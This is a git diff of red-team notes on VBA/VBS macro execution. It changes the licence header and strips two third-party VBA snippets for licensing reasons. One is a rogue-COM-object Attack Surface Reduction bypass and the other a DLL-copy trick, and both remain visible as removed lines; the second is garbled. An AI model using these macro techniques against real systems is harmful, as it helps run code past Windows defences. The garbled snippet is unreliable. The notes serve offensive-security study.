@@ -1,13 +1,14 @@
 <!---------------------------------------------------------------------------------
 Copyright: (c) BLS OPS LLC.
 This program is free software: you can redistribute it and/or modify
-it under the terms of the GNU General Public License as published by
-the Free Software Foundation, version 3.
+it under the terms of the GNU Affero General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.
-You should have received a copy of the GNU General Public License
+GNU Affero General Public License for more details.
+You should have received a copy of the GNU Affero General Public License
 along with this program. If not, see <https://www.gnu.org/licenses/>.
 --------------------------------------------------------------------------------->
 # VBA/VBS Execution ([`Office` TTP](TTP/T1137_Office_Application_Startup/T1137.md), [`Command and Scripting Interpreter - Visual Basic` TTP](TTP/T1059_Command_and_Scripting_Interpreter/005_Visual_Basic/T1059.005.md))
@@ -216,24 +217,8 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 		* Since we have access to the registry, we can simply just create a new rogue COM object with LocalServer32 set and call it. ASR Bypass.
 	* Code
 
-			' Exec process by creating custom COM object
-			Sub ComObjectExec(targetPath)
-			    Dim wsh As Object
-			    Dim regKey, clsid As String
-			    Set wsh = CreateObject("WScript.Shell")
-			    ' Register a false com object
-			    clsid = "{C7B167EA-DB3E-4659-BBDC-D1CCC00EFE9C}"
-			    regKeyClass = "HKEY_CURRENT_USER\Software\Classes\CLSID\" & clsid & "\"
-			    regKeyLocalServer = "HKEY_CURRENT_USER\Software\Classes\CLSID" & clsid & "\LocalServer32\"
-			    ' Create keys
-			    wsh.RegWrite regKeyClass, "whatever", "REG_SZ"
-			    wsh.RegWrite regKeyLocalServer, targetPath, "REG_EXPAND_SZ"
-			    ' Start registered COM object CLSID
-			    GetObject ("new:" & clsid)
-			    ' Remove keys
-			    wsh.RegDelete regKeyLocalServer
-			    wsh.RegDelete regKeyClass
-			End Sub
+			Removed by Black Lantern Security on 2026-10-23: third-party ComObjectExec VBA by Emeric Nasi (sevagas),
+			no license found. Obtain it from https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf. See THIRD_PARTY_NOTICES.md.
 * Move DLL and change directory
 	* References
 		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
@@ -241,16 +226,8 @@ along with this program. If not, see <https://www.gnu.org/licenses/>.
 		* NOTE: The loaded DLL does not have necessarily to have “.dll” extension. This is interesting to know if you need to drop/load malicious DLLs from and Office macro.
 	* Code
 
-			Private Declare PtrSafe Sub Sleep Lib "k32.dell" (ByVal dwMilliseconds As Long)
-			' Wait two seconds and execute
-			    ' copy kernel32 dll to TEMP
-			    WScriptExec ("cmd.exe" /C copy /b C:\windows\system32\kernel32.dell " & Environ("TEMP") & "\k32.dll")
-			    ' move to TEMP
-			    CreateObject("WScript.Shell").currentdirectory = Environ("TEMP")
-			    ' Call Sleep, will load Sleep function in copied kernel32
-			    Sleep 2000
-			    WscriptExec "notepad.exe"
-			End Sub
+			Removed by Black Lantern Security on 2026-10-23: third-party Move-DLL VBA snippet by Emeric Nasi (sevagas),
+			no license found. Obtain it from https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf. See THIRD_PARTY_NOTICES.md.
 
 			' Exec process using WScript.Shell
 			Sub WscriptExec(targetPath As String)
